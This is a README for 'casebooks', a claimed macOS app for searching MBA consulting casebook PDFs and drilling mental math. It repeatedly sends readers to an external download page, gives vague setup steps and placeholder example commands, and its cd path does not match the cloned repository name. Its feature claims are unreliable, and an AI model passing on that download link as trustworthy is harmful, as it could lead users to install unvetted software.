# casebooks v2026 - casebook search and study tools 2026

> **A macOS-only local workspace for MBA consulting casebook libraries, with full-text search, semantic lookup, PDF page export, and mental math practice in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-macOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/benyoungyn4231/casebooks-macos-study-hub-2026?style=flat-square)](https://github.com/benyoungyn4231/casebooks-macos-study-hub-2026)

---

<p align="center">
  <a href="https://benyoungyn4231.github.io/casebooks-macos-study-hub-2026/">
    <img src="https://img.shields.io/badge/Download-casebooks%20Latest-brightgreen?style=for-the-badge" alt="Download casebooks">
  </a>
</p>

> **[Download Latest Build](https://benyoungyn4231.github.io/casebooks-macos-study-hub-2026/)**
---

[Download Latest Build](https://benyoungyn4231.github.io/casebooks-macos-study-hub-2026/)

---

## What casebooks does

casebooks is a local toolkit for browsing and studying MBA consulting casebooks on macOS. It is aimed at recruiting prep, letting you keep your case material in one place without depending on a remote service or cloud workflow.

It covers two core use cases in a single app: searching your casebook collection and practicing interview skills. You can look up exact phrases, search by semantic similarity through embeddings, export PDF pages as PNGs for exhibit work, and run timed mental math drills with topic tracking to keep practice organized.

---

## Capabilities

- Search a local library of MBA consulting casebooks from a single collection
- Perform full-text searches and open the exact PDF page where the match is found
- Use semantic search to surface cases by meaning, with no API keys needed
- Export PDF pages to PNG for exhibit viewing and reuse
- Train with a timed mental math drill for interview preparation
- Keep drill topics tracked so review and repetition stay structured
- Run fully locally, with no server component and no database to configure
- Stay on macOS with a lightweight, utility-focused workflow

---

## Getting started

Clone the repository and open the project directory locally:

    git clone https://github.com/benyoungyn4231/casebooks-macos-study-hub-2026.git
    cd casebooks

If you are using the downloadable build, download the latest package from the project page and place it wherever you prefer. Then launch the app, or open the local entry point that comes with your build, to begin searching your library.

---

## How to use it

First, point casebooks at your local casebook files. After that, you can browse and search the library through the interface.

Typical tasks look like this:

1. Search by case topic, firm, industry, or keyword.
2. Open a matching result and inspect the exact page location.
3. Switch to semantic search when you want related material based on meaning instead of literal wording.
4. Export pages to PNG when you need a clean image of a chart or exhibit.
5. Use the mental math drill to practice under time pressure.
6. Review drill topics to identify where more repetition is needed.

Example workflow:

    # open your local library
    # search for a case
    # review page hits
    # render an exhibit page
    # start a timed drill

---

## Configuration

casebooks is meant to stay local, so setup remains simple and close to your files. Depending on how you launch it, settings usually live beside the project or inside your local data directory.

To change library paths, search behavior, or drill preferences, edit the local configuration file used by your build or launcher. If your setup uses environment variables, set them before starting the app.

Example layout:

    casebooks/
      library/
      config/
      exports/
      drills/

---

## Requirements

- macOS
- A local folder of MBA consulting casebook PDFs
- Enough disk space for your PDF library and any rendered PNG exports
- A machine suitable for local search and page rendering
- Optional embedding support for semantic search workflows

---

## FAQ

**How do I update casebooks?**  
Download the latest build from the project page and replace your current local copy when you want to upgrade.

**Do I need a server or database?**  
No. The application is intended for local-only use.

**Why do some searches show page images instead of only text?**  
That is normal when you use the page rendering flow for exhibit pages.

**Can I move my library to a different location?**  
Yes. Use the local configuration or launch settings provided by your build.

**What if semantic search is not returning what I expected?**  
Try a narrower query, or fall back to exact text search for direct matches.

**Where can I get help?**  
Look through the repository files, configuration, and any release notes included with the build.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
